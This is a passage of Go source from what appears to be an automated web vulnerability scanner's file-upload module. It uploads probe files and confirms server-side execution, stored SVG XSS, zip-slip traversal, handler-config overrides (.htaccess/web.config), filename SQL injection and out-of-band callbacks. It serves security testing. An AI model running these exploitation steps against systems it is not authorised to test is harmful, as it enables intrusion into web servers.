	req.Header.Set("Content-Type", contentType)
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; ReconBot/1.0)")
	for k, v := range auth {
		req.Header.Set(k, v)
	}
	resp, err := fileUploadClient.Do(req)
	if err != nil {
		return uploadResult{}, err
	}
	defer resp.Body.Close()
	raw, _ := io.ReadAll(io.LimitReader(resp.Body, fileUploadMaxResponse))
	urls := extractStoredURLs(ip.URL, resp.Header, raw, a.filename)
	return uploadResult{status: resp.StatusCode, body: string(raw), urls: urls, item: EvidenceItem{
		IdentityLabel: "upload", Request: fmt.Sprintf("%s %s\nContent-Type: %s\nfile field=%s filename=%s (%d bytes)", method, ip.URL, contentType, ip.Param, a.filename, len(a.body)),
		Response: fmt.Sprintf("HTTP %d\nLocation: %s\n\n%s", resp.StatusCode, resp.Header.Get("Location"), truncate(string(raw), 1500)),
	}}, nil
}

// buildJSONUploadPayload preserves the discovered request shape. APIs generally
// use either a structured file object or a flat base64/data-URI field plus
// sibling filename/MIME properties; forcing every API into one invented schema
// made valid upload endpoints fail validation before the proof could run.
func buildJSONUploadPayload(ip insertionPoint, a fileUploadAttempt) map[string]any {
	root := map[string]any{}
	if raw := buildJSONFieldsTyped(ip.Siblings, ip.SiblingTypes, ""); raw != "" {
		_ = json.Unmarshal([]byte(raw), &root)
	}
	encoded := base64.StdEncoding.EncodeToString(a.body)
	if hasUploadMetadataSibling(ip) {
		for key := range ip.Siblings {
			switch uploadLeafName(key) {
			case "filename", "file_name", "name":
				setUploadJSONPath(root, key, a.filename)
			case "mime", "mimetype", "mime_type", "contenttype", "content_type":
				setUploadJSONPath(root, key, a.contentType)
			}
		}
		if strings.HasPrefix(strings.ToLower(strings.TrimSpace(ip.Value)), "data:") {
			setUploadJSONPath(root, ip.Param, "data:"+a.contentType+";base64,"+encoded)
		} else {
			setUploadJSONPath(root, ip.Param, encoded)
		}
		return root
	}
	value := structuredJSONFileValue(ip.Value, a, encoded)
	if strings.EqualFold(strings.Trim(ip.Param, "[]"), "files") {
		setUploadJSONPath(root, strings.TrimSuffix(ip.Param, "[]"), []any{value})
	} else {
		setUploadJSONPath(root, ip.Param, value)
	}
	return root
}

func structuredJSONFileValue(discovered string, a fileUploadAttempt, encoded string) map[string]any {
	value := map[string]any{}
	_ = json.Unmarshal([]byte(strings.TrimSpace(discovered)), &value)
	if len(value) == 0 {
		return map[string]any{"filename": a.filename, "content_type": a.contentType, "data": encoded}
	}
	seenName, seenMIME, seenData := false, false, false
	for key, old := range value {
		switch uploadLeafName(key) {
		case "filename", "file_name", "name":
			value[key], seenName = a.filename, true
		case "mime", "mimetype", "mime_type", "contenttype", "content_type", "type":
			value[key], seenMIME = a.contentType, true
		case "data", "base64", "content", "body":
			if text, _ := old.(string); strings.HasPrefix(strings.ToLower(strings.TrimSpace(text)), "data:") {
				value[key] = "data:" + a.contentType + ";base64," + encoded
			} else {
				value[key] = encoded
			}
			seenData = true
		}
	}
	if !seenName {
		value["filename"] = a.filename
	}
	if !seenMIME {
		value["content_type"] = a.contentType
	}
	if !seenData {
		value["data"] = encoded
	}
	return value
}

func setUploadJSONPath(root map[string]any, rawPath string, value any) {
	parts := strings.Split(strings.ReplaceAll(strings.Trim(rawPath, "[]"), "][", "."), ".")
	cur := root
	for i, raw := range parts {
		part := strings.Trim(strings.TrimSpace(raw), "[]")
		if part == "" {
			continue
		}
		if i == len(parts)-1 {
			cur[part] = value
			return
		}
		next, ok := cur[part].(map[string]any)
		if !ok {
			next = map[string]any{}
			cur[part] = next
		}
		cur = next
	}
}

var pathLikeUploadURL = regexp.MustCompile(`(?i)(?:https?://[^\s"'<>]+|/[a-z0-9_./%+~-]+)`) // response hints only

func extractStoredURLs(uploadURL string, h http.Header, raw []byte, filename string) []string {
	var values []string
	if loc := strings.TrimSpace(h.Get("Location")); loc != "" {
		values = append(values, loc)
	}
	var decoded any
	if json.Unmarshal(raw, &decoded) == nil {
		collectUploadURLValues(decoded, "", &values)
	}
	values = append(values, pathLikeUploadURL.FindAllString(string(raw), 20)...)
	if u, err := url.Parse(uploadURL); err == nil {
		values = append(values, "/uploads/"+url.PathEscape(filename), path.Dir(u.Path)+"/"+url.PathEscape(filename))
		// APIs often return only the stored object name/key. Preserve those hints
		// as bounded predictable locations; proof retrieval still decides whether
		// anything dangerous happened.
		for _, value := range append([]string(nil), values...) {
			if strings.ContainsAny(value, "/\\") || strings.Contains(value, "://") {
				continue
			}
			values = append(values, "/uploads/"+url.PathEscape(value), path.Dir(u.Path)+"/"+url.PathEscape(value))
		}
	}
	seen := map[string]bool{}
	out := make([]string, 0, len(values))
	base, err := url.Parse(uploadURL)
	if err != nil {
		return nil
	}
	for _, value := range values {
		value = strings.Trim(strings.TrimSpace(value), `"'<>.,`)
		if value == "" {
			continue
		}
		u, err := url.Parse(value)
		if err != nil {
			continue
		}
		u = base.ResolveReference(u)
		if (u.Scheme != "http" && u.Scheme != "https") || !strings.EqualFold(u.Host, base.Host) {
			continue
		}
		u.Fragment = ""
		candidate := u.String()
		if !seen[candidate] {
			seen[candidate] = true
			out = append(out, candidate)
		}
		if len(out) == 24 {
			break
		}
	}
	return out
}

func collectUploadURLValues(v any, key string, out *[]string) {
	switch x := v.(type) {
	case map[string]any:
		for k, child := range x {
			collectUploadURLValues(child, strings.ToLower(k), out)
		}
	case []any:
		for _, child := range x {
			collectUploadURLValues(child, key, out)
		}
	case string:
		if key == "url" || key == "uri" || key == "href" || key == "path" || key == "location" || key == "file" ||
			key == "filename" || key == "file_name" || key == "key" || key == "object_key" ||
			strings.Contains(key, "download") || strings.Contains(key, "public") {
			*out = append(*out, x)
		}
	}
}

func (s *FileUploadScanner) fetch(ctx context.Context, rawURL string, auth map[string]string) (int, string, EvidenceItem) {
	reqCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()
	req, err := http.NewRequestWithContext(reqCtx, http.MethodGet, rawURL, nil)
	if err != nil {
		return 0, "", EvidenceItem{}
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; ReconBot/1.0)")
	for k, v := range auth {
		req.Header.Set(k, v)
	}
	resp, err := fileUploadClient.Do(req)
	if err != nil {
		return 0, "", EvidenceItem{}
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, fileUploadMaxResponse))
	return resp.StatusCode, string(body), EvidenceItem{IdentityLabel: "retrieval", Request: "GET " + rawURL,
		Response: fmt.Sprintf("HTTP %d\nContent-Type: %s\n\n%s", resp.StatusCode, resp.Header.Get("Content-Type"), truncate(string(body), 1500))}
}

func (s *FileUploadScanner) verifyExecution(ctx context.Context, ip insertionPoint, auth map[string]string, a fileUploadAttempt, urls []string) (string, string) {
	for _, candidate := range urls {
		if !urlHostInScope(ctx, candidate) {
			continue
		}
		status, body, _ := s.fetch(ctx, candidate, auth)
		if status >= 200 && status < 400 && strings.Contains(body, a.marker) && !bytes.Contains(a.body, []byte(a.marker)) {
			return candidate, "Uploaded file was retrieved and server-side execution reconstructed the unique marker " + a.marker + "; the full marker does not occur literally in the uploaded source"
		}
	}
	return "", ""
}

func (s *FileUploadScanner) verifySVG(ctx context.Context, auth map[string]string, a fileUploadAttempt, urls []string) (string, string) {
	if s.confirmStoredXSS == nil {
		return "", ""
	}
	for _, candidate := range urls {
		if urlHostInScope(ctx, candidate) && s.confirmStoredXSS(ctx, candidate, auth, a.marker) {
			return candidate, "Stored SVG executed in Chromium and independently set the expected marker " + a.marker
		}
	}
	return "", ""
}

func (s *FileUploadScanner) verifyOOB(ctx context.Context, a fileUploadAttempt) (string, string) {
	if a.marker == "" {
		return "", ""
	}
	var hits int
	var evidence string
	_ = s.db.QueryRowContext(ctx, `SELECT hit_count,COALESCE(evidence,'') FROM oob_probes WHERE token=?`, a.marker).Scan(&hits, &evidence)
	if hits > 0 {
		if evidence == "" {
			evidence = "Attributed out-of-band callback confirmed processing of uploaded " + a.filename + " (token " + a.marker + ")"
		}
		return "oob:" + a.marker, evidence
	}
	// Normal callbacks may arrive after this bounded phase has completed. The API
	// callback handler owns that asynchronous promotion, so no polling delay is
	// added to every upload candidate here.
	return "", ""
}

func (s *FileUploadScanner) verifyZipSlip(ctx context.Context, ip insertionPoint, auth map[string]string, a fileUploadAttempt, hinted []string) (string, string) {
	base, err := url.Parse(ip.URL)
	if err != nil {
		return "", ""
	}
	paths := make([]string, 0, len(hinted)+2)
	// A response hint is only proof when the extracted marker is served outside
	// the archive's own storage directory. Accepting /uploads/<marker>.txt made a
	// normal, safe extractor look like path traversal.
	for _, candidate := range hinted {
		if zipSlipProofOutsideUploadDir(candidate, a.filename, hinted) {
			paths = append(paths, candidate)
		}
	}
	for _, p := range []string{"/" + a.marker + ".txt", path.Dir(path.Dir(base.Path)) + "/" + a.marker + ".txt"} {
		u := *base
		u.Path, u.RawQuery, u.Fragment = path.Clean(p), "", ""
		paths = append(paths, u.String())
	}
	seen := map[string]bool{}
	for _, candidate := range paths {
		if seen[candidate] || !urlHostInScope(ctx, candidate) {
			continue
		}
		seen[candidate] = true
		status, body, _ := s.fetch(ctx, candidate, auth)
		if status >= 200 && status < 300 && strings.TrimSpace(body) == a.marker {
			return candidate, "Archive member ../../" + a.marker + ".txt was independently retrieved outside the intended upload directory"
		}
	}
	return "", ""
}

func zipSlipProofOutsideUploadDir(candidate, archiveName string, hinted []string) bool {
	u, err := url.Parse(candidate)
	if err != nil || u.Path == "" {
		return false
	}
	candidateDir := path.Clean(path.Dir(u.Path))
	for _, hint := range hinted {
		h, err := url.Parse(hint)
		if err != nil || !strings.EqualFold(path.Base(h.Path), archiveName) {
			continue
		}
		if strings.EqualFold(h.Host, u.Host) && candidateDir == path.Clean(path.Dir(h.Path)) {
			return false
		}
	}
	return !strings.Contains(strings.ToLower(candidateDir), "/uploads")
}

func (s *FileUploadScanner) verifyConfigEffect(ctx context.Context, ip insertionPoint, auth map[string]string, configAttempt fileUploadAttempt) (string, string) {
	language := "php"
	if strings.EqualFold(configAttempt.filename, "web.config") {
		language = "aspx"
	}
	proof := fileUploadAttempt{name: configAttempt.name, subtype: configAttempt.subtype, filename: "recon-proof.rcn", contentType: "application/octet-stream",
		body: executableUploadBody(language, configAttempt.marker, ""), marker: configAttempt.marker, proof: proofExecution}
	result, err := s.upload(ctx, ip, auth, proof)
	if err != nil || result.status < 200 || result.status >= 400 {
		return "", ""
	}
	proofURL, evidence := s.verifyExecution(ctx, ip, auth, proof, result.urls)
	if evidence == "" {
		return "", ""
	}
	return proofURL, "Uploaded " + configAttempt.filename + " changed web-root handler behavior; a separately uploaded .rcn file then executed marker " + configAttempt.marker
}

// verifySQLiFilename re-uploads the SAME attempt under a clean, quote-free
// filename and compares the two responses for a NEW SQL error signature
// (sqlErrorAppeared, shared with the SQLi module) rather than pattern-matching
// the payload response alone — an app that always shows a generic "invalid
// file" error for any unusual filename would otherwise look identical to a
// real injection.
func (s *FileUploadScanner) verifySQLiFilename(ctx context.Context, ip insertionPoint, auth map[string]string, a fileUploadAttempt, injectedBody string) (string, string) {
	clean := fileUploadAttempt{name: a.name, subtype: a.subtype, filename: "reconclean.txt", contentType: a.contentType, body: a.body}
	result, err := s.upload(ctx, ip, auth, clean)
	if err != nil || result.status < 200 || result.status >= 400 {
		return "", ""
	}
	if !sqlErrorAppeared(result.body, injectedBody) {
		return "", ""
	}
	return ip.URL, "Filename containing a SQL metacharacter (') triggered a new database error signature absent from an identical upload with a clean filename — the filename is very likely inserted into a query unsanitized"
}

func (s *FileUploadScanner) storeFinding(ctx context.Context, targetID string, ip insertionPoint, a fileUploadAttempt, proofURL, evidence string, uploadEvidence EvidenceItem) bool {
	ids, err := RecordDetectorObservation(ctx, s.db, DetectorObservation{
		TargetID: targetID, Type: "file_upload", Subtype: a.subtype, Severity: "critical",
		URL: ip.URL, Method: strings.ToUpper(ip.Method), Parameter: ip.Param, Location: insertionLocation(ip),
		Payload: a.filename, Evidence: evidence, Source: "file-upload-native", DetectionMethod: "retrieval-or-processing-proof",
		Confidence: ConfPoC, Priority: 500, Verdict: VerifyVerified,
	})
	if err != nil || ids.FindingID == "" {
		return false
	}
	uploadEvidence.Comparison = "Upload acceptance alone is not proof; paired with independent dangerous retrieval/processing at " + proofURL
	_, _, retrieval := s.fetch(ctx, proofURL, loadAuthHeaders(ctx, s.db, targetID))
	StoreEvidence(ctx, s.db, ids.FindingID, targetID, "file-upload-proof", evidence, []EvidenceItem{uploadEvidence, retrieval})
	// The callback API owns the user notification. Suppressing a second broadcast
	// here keeps Telegram/WebSocket alerts idempotent when the hit arrives before
	// this phase returns.
	return true
}

// storeOOBFinding deliberately matches the callback handler's candidate identity
// (source, method, subtype and location), making a fast in-phase observation and
// a later asynchronous API callback idempotent rather than duplicate findings.
func (s *FileUploadScanner) storeOOBFinding(ctx context.Context, targetID string, ip insertionPoint, a fileUploadAttempt, evidence string, uploadEvidence EvidenceItem) bool {
	ids, err := RecordDetectorObservation(ctx, s.db, DetectorObservation{
		TargetID: targetID, Type: "file_upload", Subtype: a.oobKind, Severity: "critical",
		URL: ip.URL, Method: "CALLBACK", Parameter: ip.Param, Location: "upload:" + a.filename,
		Payload: "oob token=" + a.marker, Evidence: evidence, Source: "oast-callback",
		DetectionMethod: "/oob/" + a.marker, Confidence: ConfPoC, Priority: 500, Verdict: VerifyVerified,
	})
	if err != nil || ids.FindingID == "" {
		return false
	}
	uploadEvidence.Comparison = "Upload acceptance was promoted only after its unique OOB token received an attributed callback"
	StoreEvidence(ctx, s.db, ids.FindingID, targetID, "file-upload-oob-proof", evidence, []EvidenceItem{uploadEvidence})
	if s.broadcast != nil {
		s.broadcast("new_vuln_finding", map[string]any{"target_id": targetID, "type": "file_upload", "url": ip.URL, "parameter": ip.Param})
	}
	return true
}
